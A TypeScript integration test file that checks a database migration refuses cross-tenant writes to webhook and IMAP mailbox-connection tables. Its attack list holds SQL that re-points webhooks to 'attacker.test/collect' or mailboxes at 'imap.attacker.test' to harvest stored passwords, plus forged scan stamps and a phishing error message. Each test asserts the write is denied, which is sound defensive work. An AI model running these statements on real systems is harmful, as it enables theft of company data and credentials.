// tests/integration/s07e-b-routes.int.test.ts
//
// S-07e part B (migration 946): the route tables. SQL injected on either app
// pool can forge request.jwt.claims and app.current_company_id, so RLS admits a
// write to any company's row. Each statement below would plant or re-point a
// standing route out of a company:
//   webhook_endpoints        a feed of a company's events to an outside URL
//                            (planted, re-pointed, re-subscribed or revived);
//   imap_mirror_connections,
//   sent_mirror_connections  the mailbox a company's documents are read from:
//                            re-pointing a victim's connection at another host
//                            makes the scan cron decrypt the victim's stored
//                            mailbox password and present it to that host.
// Each must now be refused by privilege, on the logins production has. Review
// round 5: so is every stamp a scan or a delivery writes (breaker rounds forged
// them across tenants: a NULL or ancient last_scan_at pinned the cron's 20 due
// slots, a scan_cursor skipped a mailbox's mail, a failure_count delayed or
// hastened an auto-disable); those writes run on migration_admin now. The
// legitimate paths: s07e-b-routes-paths-*.int.test.ts; the migration:
// s07e-b-routes.migration.int.test.ts.
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import type { Pool } from 'pg';
import { getAuthPool } from '@/lib/auth/authPool';
import { getDbPool } from '@/lib/neon';
import { attempt, fixture, newIds, setup, teardown } from './s07b-app-pool-login-role.helpers';

const ids = newIds();
// owner owns `company`; `other` is the victim, owned by victimOwner, whose claims the attacker forges.
const { owner, company, other } = ids;
const victimOwner = crypto.randomUUID();

beforeAll(async () => {
  await setup(ids);
  const q = (text: string, params: unknown[] = []) => fixture.query(text, params);
  await q(`INSERT INTO users (id, email, role, is_active, status) VALUES ($1, $2, 'viewer', true, 'active')`,
    [victimOwner, `${victimOwner}@test.local`]);
  await q(`INSERT INTO company_users (company_id, user_id, role, is_default) VALUES ($1, $2, 'owner', true)`, [other, victimOwner]);
  await q(`INSERT INTO webhook_endpoints (company_id, name, url, secret, events, is_active)
    VALUES ($1, 'victim ERP', 'https://erp.victim.test/hook', 'enc:secret', '{invoice.sent}', false)`, [other]);
  for (const t of ['imap_mirror_connections', 'sent_mirror_connections']) {
    await q(`INSERT INTO ${t} (company_id, provider, display_name, account_email, status, imap_host, imap_port, imap_use_tls,
      imap_username, imap_password_enc) VALUES ($1, 'imap', 'Victim inbox', 'ap@victim.test', 'disconnected', 'imap.victim.test', 993, true,
      'ap@victim.test', 'enc:mailbox-password')`, [other]);
  }
}, 60000);

afterAll(async () => {
  const q = (text: string, params: unknown[] = []) => fixture.query(text, params);
  for (const t of ['webhook_endpoints', 'imap_mirror_connections', 'sent_mirror_connections']) {
    await q(`DELETE FROM ${t} WHERE company_id = ANY($1)`, [[company, other]]);
  }
  await q('DELETE FROM company_users WHERE user_id = $1', [victimOwner]);
  await q('DELETE FROM users WHERE id = $1', [victimOwner]);
  await teardown(ids, [getAuthPool(), getDbPool()]);
});

const denied = (table: string) => ({ code: '42501', message: `permission denied for table ${table}` });
// A statement that touches no row fails with division_by_zero, so on a database
// without 946 an attack that "succeeds" by matching nothing is not taken for a refusal.
const hit = (dml: string) => `WITH w AS (${dml} RETURNING 1) SELECT 1 / count(*) FROM w`;

/** [what it would do, table, statement] — every one aims at the victim (`$1` is its company). */
type Attack = [string, string, string];
const ATTACKS: Attack[] = [
  ['an endpoint planted on another company', 'webhook_endpoints', hit(`INSERT INTO webhook_endpoints (company_id, name, url, events, is_active)
    VALUES ($1, 'x', 'https://attacker.test/collect', '{invoice.sent}', true)`)],
  ['an endpoint re-pointed', 'webhook_endpoints', hit(`UPDATE webhook_endpoints SET url = 'https://attacker.test/collect' WHERE company_id = $1`)],
  ['an endpoint re-subscribed', 'webhook_endpoints', hit(`UPDATE webhook_endpoints SET events = '{invoice.sent,payment.received}'
    WHERE company_id = $1`)],
  ['a disabled endpoint revived', 'webhook_endpoints', hit('UPDATE webhook_endpoints SET is_active = true WHERE company_id = $1')],
  ['an endpoint\'s signing secret replaced', 'webhook_endpoints', hit(`UPDATE webhook_endpoints SET secret = 'enc:known' WHERE company_id = $1`)],
  ['an endpoint deleted', 'webhook_endpoints', hit('DELETE FROM webhook_endpoints WHERE company_id = $1')],
  ['a mailbox re-pointed at another host', 'imap_mirror_connections', hit(`UPDATE imap_mirror_connections
    SET imap_host = 'imap.attacker.test', imap_use_tls = false WHERE company_id = $1`)],
  ['a mailbox connection revived', 'imap_mirror_connections', hit(`UPDATE imap_mirror_connections SET status = 'active'
    WHERE company_id = $1`)],
  ['a mailbox planted on another company', 'imap_mirror_connections', hit(`INSERT INTO imap_mirror_connections
    (company_id, provider, display_name, account_email, imap_host, imap_username, imap_password_enc)
    VALUES ($1, 'imap', 'x', 'x@attacker.test', 'imap.attacker.test', 'x', 'enc:x')`)],
  ['a mailbox\'s sender filter opened', 'imap_mirror_connections', hit(`UPDATE imap_mirror_connections SET allowed_senders = '{}',
    denied_senders = '{}' WHERE company_id = $1`)],
  ['a mailbox connection deleted', 'imap_mirror_connections', hit('DELETE FROM imap_mirror_connections WHERE company_id = $1')],
  ['a sent mailbox re-pointed at another host', 'sent_mirror_connections', hit(`UPDATE sent_mirror_connections
    SET imap_host = 'imap.attacker.test' WHERE company_id = $1`)],
  ['a sent mailbox planted on another company', 'sent_mirror_connections', hit(`INSERT INTO sent_mirror_connections
    (company_id, provider, display_name, account_email, imap_host, imap_username, imap_password_enc)
    VALUES ($1, 'imap', 'x', 'x@attacker.test', 'imap.attacker.test', 'x', 'enc:x')`)],
  ['a sent mailbox connection revived', 'sent_mirror_connections', hit(`UPDATE sent_mirror_connections SET status = 'active'
    WHERE company_id = $1`)],
];

// One column per statement: a refusal of the multi-column attacks above could hide a column that is still writable.
const MIRRORS = ['imap_mirror_connections', 'sent_mirror_connections'] as const;
const SINGLE: Attack[] = [
  ['an endpoint\'s signing secret replaced (alone)', 'webhook_endpoints', hit(`UPDATE webhook_endpoints SET secret = 'enc:known' WHERE company_id = $1`)],
  ['an endpoint moved to another company (company_id alone)', 'webhook_endpoints',
    hit('UPDATE webhook_endpoints SET company_id = $1 WHERE company_id = $1')],
  ...MIRRORS.flatMap((t): Attack[] => [
    [`${t}: the stored mailbox password replaced (imap_password_enc alone)`, t,
      hit(`UPDATE ${t} SET imap_password_enc = 'enc:known' WHERE company_id = $1`)],
    [`${t}: the mailbox login replaced (imap_username alone)`, t, hit(`UPDATE ${t} SET imap_username = 'attacker' WHERE company_id = $1`)],
    [`${t}: the mailbox port replaced (imap_port alone)`, t, hit(`UPDATE ${t} SET imap_port = 25 WHERE company_id = $1`)],
    [`${t}: a connection moved to another company (company_id alone)`, t, hit(`UPDATE ${t} SET company_id = $1 WHERE company_id = $1`)],
  ]),
];
// Round 5: the stamps. Every forgery breaker rounds executed, plus the shapes next to them.
const STAMP_FORGERIES: Attack[] = [
  ...MIRRORS.flatMap((t): Attack[] => [
    [`${t}: last_scan_at forged NULL (pins a due slot first)`, t, hit(`UPDATE ${t} SET last_scan_at = NULL WHERE company_id = $1`)],
    [`${t}: last_scan_at forged into the past (1970)`, t, hit(`UPDATE ${t} SET last_scan_at = '1970-01-01' WHERE company_id = $1`)],
    [`${t}: last_scan_at forged into the future (9999)`, t, hit(`UPDATE ${t} SET last_scan_at = '9999-01-01' WHERE company_id = $1`)],
    [`${t}: scan_cursor forged past UIDNEXT (skips the mailbox's mail)`, t,
      hit(`UPDATE ${t} SET scan_cursor = '{"INBOX": 4294967295, "Sent": 4294967295}' WHERE company_id = $1`)],
    [`${t}: scan_cursor reset (re-reads the mailbox)`, t, hit(`UPDATE ${t} SET scan_cursor = '{}' WHERE company_id = $1`)],
    [`${t}: last_error forged`, t, hit(`UPDATE ${t} SET last_error = 'Your mailbox password expired: re-enter it at https://attacker.test'
      WHERE company_id = $1`)],
    [`${t}: last_success_at forged`, t, hit(`UPDATE ${t} SET last_success_at = NOW() WHERE company_id = $1`)],
    [`${t}: updated_at written (the touch trigger's column)`, t, hit(`UPDATE ${t} SET updated_at = NOW() WHERE company_id = $1`)],
  ]),
  ['imap_mirror_connections: the ingested counter forged', 'imap_mirror_connections',
    hit('UPDATE imap_mirror_connections SET messages_ingested_total = 0 WHERE company_id = $1')],
  ['sent_mirror_connections: the counters forged', 'sent_mirror_connections',
    hit('UPDATE sent_mirror_connections SET messages_captured_total = 0, messages_linked_total = 0 WHERE company_id = $1')],
  ['webhook_endpoints: failure_count reset (delays the auto-disable)', 'webhook_endpoints',
    hit('UPDATE webhook_endpoints SET failure_count = 0 WHERE company_id = $1')],
  ['webhook_endpoints: failure_count raised (hastens the auto-disable)', 'webhook_endpoints',
    hit('UPDATE webhook_endpoints SET failure_count = 9 WHERE company_id = $1')],
  ['webhook_endpoints: last_triggered_at forged', 'webhook_endpoints', hit('UPDATE webhook_endpoints SET last_triggered_at = NULL WHERE company_id = $1')],
  ...['imap_mirror_connections', 'sent_mirror_connections', 'webhook_endpoints'].map((t): Attack =>
    [`${t}: a row lock taken (FOR UPDATE needs UPDATE; it would hold up the stamps)`, t, `SELECT 1 / count(*) FROM (SELECT 1 FROM ${t}
      WHERE company_id = $1 FOR UPDATE) l`]),
  ...['imap_mirror_connections', 'sent_mirror_connections', 'webhook_endpoints'].map((t): Attack =>
    [`${t}: a key-share lock taken directly (FOR KEY SHARE needs UPDATE too)`, t, `SELECT 1 / count(*) FROM (SELECT 1 FROM ${t}
      WHERE company_id = $1 FOR KEY SHARE) l`]),
];
const TRUNCATED = ['webhook_endpoints', ...MIRRORS];

const pools: Array<[string, () => Pool, Parameters<typeof attempt>[2]]> = [
  ['isaflow_app under the victim owner\'s forged claims', getAuthPool, { asRequest: { sub: victimOwner, companyId: other } }],
  ['isaflow_service with no claims', getDbPool, {}],
  ['isaflow_service under the owner\'s claims', getDbPool, { claims: { sub: owner, companyId: company } }],
];

describe.each(pools)('S-07e part B (946): %s', (_, pool, opts) => {
  it.each(ATTACKS)('cannot: %s', async (_what, table, text) => {
    expect(await attempt(pool(), [[text, [other]]], opts)).toEqual(denied(table));
  });

  it.each(SINGLE)('cannot: %s', async (_what, table, text) => {
    expect(await attempt(pool(), [[text, [other]]], opts)).toEqual(denied(table));
  });

  it.each(STAMP_FORGERIES)('cannot (round 5): %s', async (_what, table, text) => {
    expect(await attempt(pool(), [[text, [other]]], opts)).toEqual(denied(table));
  });

  it.each(TRUNCATED)('cannot TRUNCATE %s', async (table) => {
    expect(await attempt(pool(), [[`TRUNCATE ${table}`]], opts)).toEqual(denied(table));
  });

  const firstPerTable = ATTACKS.filter(([, t], i) => ATTACKS.findIndex(([, u]) => u === t) === i);
  it.each(firstPerTable)('cannot: %s, after set_config(role, none) either', async (_what, table, text) => {
    expect(await attempt(pool(), [[`SELECT set_config('role', 'none', true)`], [text, [other]]], opts)).toEqual(denied(table));
  });
});

describe('S-07e part B (946): what the app pools keep', () => {
  it.each([
    ['the scan cron\'s and the dispatcher\'s read of a connection, credentials included', `SELECT 1 / count(*) FROM imap_mirror_connections
      WHERE company_id = $1 AND imap_password_enc IS NOT NULL`],
    ['a read of an endpoint, its signing secret included', 'SELECT 1 / count(*) FROM webhook_endpoints WHERE company_id = $1 AND secret IS NOT NULL'],
  ])('%s, on the service pool', async (_, text) => {
    expect(await attempt(getDbPool(), [[text, [other]]])).toBeNull();
  });

  // The stamps the first 946 left app-writable (round 5 took them): one column at a time, on the service pool with no claims,
  // the way breaker5 sent its NULL pin.
  it.each([
    ['webhook_endpoints', 'last_triggered_at = NOW()'], ['webhook_endpoints', 'failure_count = 0'],
    ...MIRRORS.flatMap((t) => ['scan_cursor = scan_cursor', 'last_scan_at = NOW()', 'last_success_at = NOW()', 'last_error = NULL']
      .map((set) => [t, set] as [string, string])),
    ['imap_mirror_connections', 'messages_ingested_total = messages_ingested_total + 1'],
    ['sent_mirror_connections', 'messages_captured_total = messages_captured_total + 1'],
    ['sent_mirror_connections', 'messages_linked_total = messages_linked_total + 1'],
  ])('%s: SET %s is refused', async (table, set) => {
    expect(await attempt(getDbPool(), [[hit(`UPDATE ${table} SET ${set} WHERE company_id = $1`), [other]]])).toEqual(denied(table));
  });
});
